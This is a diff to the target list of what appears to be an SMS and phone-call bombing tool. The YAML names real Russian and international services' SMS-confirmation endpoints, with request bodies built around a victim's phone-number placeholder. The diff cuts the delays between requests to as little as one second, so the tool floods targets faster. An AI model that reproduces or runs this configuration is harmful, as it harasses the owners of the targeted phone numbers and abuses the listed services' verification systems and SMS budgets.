@@ -14,19 +14,19 @@
   method: 'POST'
   body: 'phone=<num2>'
   okRes: '{"phone":"'
-  delay: 121
+  delay: 5
 
 - url: 'https://belkacar.ru/get-confirmation-code'
   method: 'POST'
   body: 'phone=<num>'
   okRes: 'success":true'
-  delay: 61
+  delay: 5
 
 - url: 'https://drugvokrug.ru/siteActions/processSms.htm'
   method: 'POST'
   body: 'cell=<num>'
   okRes: 'success":true'
-  delay: 7
+  delay: 5
 
 - url: 'https://api.ennergiia.com/auth/api/development/lor'
   method: 'POST'
@@ -34,18 +34,18 @@
     Content-Type: 'application/json'
   body: '{"referrer":"ennergiia","via_sms":true,"phone":"+<num4>"}'
   okRes: '"code":"200-8"'
-  delay: 121
+  delay: 12
 
 - url: 'https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber=+<num13>'
   method: 'GET'
   okRes: 'result":"sendConfirmCode'
-  delay: 50
+  delay: 5
 
 - url: 'https://gorzdrav.org/login/register/sms/send'
   method: 'POST'
   body: 'phone=<num2>'
   okRes: 'phone'
-  delay: 121
+  delay: 5
 
 - url: 'https://p.grabtaxi.com/api/passenger/v2/profiles/register'
   method: 'POST'
@@ -63,7 +63,7 @@
   method: 'POST'
   body: 'phone=<num>&g-recaptcha-response=&recaptcha=off'
   okRes: '"success": true'
-  delay: 61
+  delay: 6
 
 - url: 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru'
   method: 'POST'
@@ -72,6 +72,7 @@
   body: '{"phone_number":"<num>"}'
   okRes: 'sms_sent":true'
   delay: 21
+
 
 - url: 'https://api.tinkoff.ru/v1/sign_up'
   method: 'POST'
@@ -93,19 +94,19 @@
     Content-Type: 'application/json'
   body: '{"phone_number":"<num2>"}'
   okRes: '"delay"'
-  delay: 61
+  delay: 6
 
 - url: 'https://youla.ru/web-api/auth/request_code'
   method: 'POST'
   body: 'phone=<num>'
   okRes: '"phone"'
-  delay: 16
+  delay: 1
 
 - url: 'https://www.citilink.ru/registration/confirm/phone/+<num>/'
   method: 'POST'
   body: ''
   okRes: '"smsRequestToken":'
-  delay: 61
+  delay: 6
 
 - url: 'http://service.matreshcar.ru/profile/smstoken'
   method: 'POST'
@@ -113,7 +114,7 @@
     Content-Type: 'application/json'
   body: '{"PhoneNumber":<num>}'
   okRes: '"validForSeconds":'
-  delay: 21
+  delay: 2
 
 - url: 'https://api.chef.yandex/api/v2/auth/sms'
   method: 'POST'
@@ -121,10 +122,10 @@
     Content-Type: 'application/json'
   body: '{"phone":"<num2>"}'
   okRes: '"token":'
-  delay: 61
+  delay: 6
 
 callServices:
 - url: 'https://findclone.ru/register?phone=+<num>'
   method: 'GET'
   okRes: '"pin_size"'
-  delay: 61
+  delay: 6
